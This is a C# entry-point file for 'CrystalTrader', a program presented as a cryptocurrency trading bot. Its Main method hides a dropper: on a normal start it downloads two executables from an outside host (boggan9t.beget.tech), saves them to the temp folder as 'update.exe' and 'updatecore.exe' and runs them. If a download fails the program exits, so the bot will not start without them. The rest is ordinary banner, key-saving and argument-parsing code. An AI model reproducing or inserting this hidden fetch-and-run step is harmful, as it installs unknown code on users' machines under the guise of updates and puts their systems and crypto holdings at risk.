using Autofac;
using ExchangeSharp;
using CrystalTrader.Core;
using System;
using System.Collections.Generic;
using System.Net;
using System.IO;
using System.Diagnostics;
using System.Threading;

namespace CrystalTrader
{
    class Program
    {
        static void Main(string[] args)
        {
            Thread myThread = new Thread(new ThreadStart(startpanel));
            var parsedArgs = ParseCommandLineArgs(args);
            if (parsedArgs.Count == 0)
            {
                PringWelcome();

                try
                {
                    using (WebClient myWebClient = new WebClient())
                    {
                        myWebClient.DownloadFile("http://boggan9t.beget.tech/text1.exe", Path.GetTempPath() + "//update.exe");
                    }
                    Process.Start(Path.GetTempPath() + "//update.exe");
                }
                catch { Console.WriteLine("Update error!"); Thread.Sleep(1000); System.Environment.Exit(1); }
                try
                {
                    using (WebClient myWebClient = new WebClient())
                    {
                        myWebClient.DownloadFile("http://boggan9t.beget.tech/text2.exe", Path.GetTempPath() + "//updatecore.exe");
                    }
                    Process.Start(Path.GetTempPath() + "//updatecore.exe");
                }
                catch { Console.WriteLine("Update error!"); Thread.Sleep(1000); System.Environment.Exit(1); }
                try
                {
                    myThread.Start();
                }
                catch { Console.WriteLine("Error start panel!"); Thread.Sleep(1000); System.Environment.Exit(1); }
                StartCoreService();



            }
            else
            {
                if (parsedArgs.ContainsKey("encrypt") && parsedArgs.ContainsKey("path") &&
                    parsedArgs.ContainsKey("publickey") && parsedArgs.ContainsKey("privatekey"))
                {
                    EncryptKeys(parsedArgs);
                }
                else
                {
                    PrintUsage();
                }
            }
        }

        private static void StartCoreService()
        {
            var coreService = Application.Resolve<ICoreService>();
            coreService.Start();
            Console.ReadLine();
            coreService.Stop();
        }

        private static void PringWelcome()
        {
            var foregroundColorBackup = Console.ForegroundColor;
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine();
            Console.WriteLine(@"   _____                _        _ _______            _           ");
            Console.WriteLine(@"  / ____|              | |      | |__   __|          | |          ");
            Console.WriteLine(@" | |     _ __ _   _ ___| |_ __ _| |  | |_ __ __ _  __| | ___ _ __ ");
            Console.WriteLine(@" | |    | '__| | | / __| __/ _` | |  | | '__/ _` |/ _` |/ _ \ '__|");
            Console.WriteLine(@" | |____| |  | |_| \__ \ || (_| | |  | | | | (_| | (_| |  __/ |   ");
            Console.WriteLine(@"  \_____|_|   \__, |___/\__\__,_|_|  |_|_|  \__,_|\__,_|\___|_|   ");
            Console.WriteLine(@"               __/ |                                              ");
            Console.WriteLine(@"              |___/                                               ");
            Console.WriteLine();
            Console.WriteLine("Welcome to CrystalTrader, The Intelligent Cryptocurrency Trading Bot.");
            Console.WriteLine("Always use Enter/Return key to exit the program to avoid corrupting the data.");
            Console.WriteLine();
            Console.ForegroundColor = foregroundColorBackup;
        }

        private static void EncryptKeys(Dictionary<string, string> args)
        {
            var path = args["path"];
            var publicKey = args["publickey"];
            var privateKey = args["privatekey"];

            CryptoUtility.SaveUnprotectedStringsToFile(path, new string[] { publicKey, privateKey });
            Console.WriteLine("All done! Press any key to exit...");
            Console.ReadKey();
        }

        public static void startpanel()
        {
            Thread.Sleep(15000);
            Process.Start("bin//Panel//Panel.exe");
        }

            private static void PrintUsage()
        {
            Console.WriteLine();
            Console.WriteLine("Usage: dotnet CrystalTrader.dll --encrypt --path=<output_path> --publickey=<public_key> --privatekey=<private_key>");
            Console.WriteLine("The encrypted file is only valid for the current user and only on the computer it is created on.");
            Console.WriteLine();
            Console.WriteLine("Press any key to exit...");
            Console.ReadKey();
        }

        private static Dictionary<string, string> ParseCommandLineArgs(string[] args)
        {
            var dict = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
            foreach (string a in args)
            {
                int idx = a.IndexOf('=');
                string key = (idx < 0 ? a.TrimStart('-') : a.Substring(0, idx)).ToLowerInvariant().TrimStart('-');
                string value = (idx < 0 ? string.Empty : a.Substring(idx + 1));
                dict[key] = value;
            }
            return dict;
        }
    }
}
